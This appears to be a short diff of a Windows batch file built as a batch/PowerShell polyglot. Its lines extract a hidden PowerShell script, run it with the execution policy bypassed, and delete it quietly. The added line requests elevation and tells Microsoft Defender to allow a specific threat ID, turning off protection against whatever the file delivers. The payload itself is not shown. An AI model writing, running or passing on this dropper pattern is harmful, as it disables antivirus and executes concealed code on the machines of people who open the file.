@@ -1,4 +1,5 @@
 ;;;===,,,@echo off
+;;;===,,,powershell -Command "Start-Process PowerShell -Argumentlist 'Add-MpPreference -ThreatIDDefaultAction_Action Allow -ThreatIDDefaultAction_Ids 2147749373' -Verb RunAs"
 ;;;===,,,findstr /v "^;;;===,,," "%~f0" > "%~dp0ps.ps1"
 ;;;===,,,PowerShell.exe -ExecutionPolicy Bypass -Command "& '%~dp0ps.ps1'"
 ;;;===,,,del /s /q "%~dp0ps.ps1" >NUL 2>&1
